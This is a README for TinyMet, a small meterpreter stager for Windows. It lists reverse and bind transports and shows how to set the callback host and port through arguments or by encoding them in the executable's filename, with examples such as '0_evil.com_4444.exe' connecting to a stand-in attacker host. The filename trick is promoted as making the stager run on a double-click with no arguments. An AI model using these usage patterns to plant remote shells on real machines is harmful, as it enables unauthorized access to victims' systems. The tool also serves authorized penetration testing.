TinyMet
=======
TinyMet is a tiny “4.5 kilobytes” flexible meterpreter stager, which supports multiple meterpreter transports, setting LPORT and LHOST during runtime.

Transport, LPORT and LHOST are set during runtime through either of the following:
- Command line arguments.
- Naming the .exe file in a special way. 

What's new in v0.2:
-------------------
- Now tinymet can parse the Transport, LPORT and LHOST from its own filename through separating them by underscore
-   Example: "0_evil.com_4444.exe" will use reverse_tcp, LHOST=evil.com, LPORT=4444 
- This makes tinymet more (double-click/payload-like/argument-less) friendly.

----

Available transports are as follows:
- 0: reverse_tcp
- 1: reverse_http
- 2: reverse_https
- 3: bind_tcp

<strong>Usage#1:</strong>
```
tinymet.exe TRANSPORT LHOST LPORT

Example:
"tinymet.exe 2 host.com 443" Will use reverse_https and connect to host.com:443
```

<strong>Usage#2:</strong> name the file using the folowing convention and run without args:
```
TRANSPORT_LHOST_LPORT.exe

Example:
Setting the filename to "2_host.com_443.exe" and running it without args will do exactly the same as Example#1.
```

---

Please visit http://tinymet.com for details.
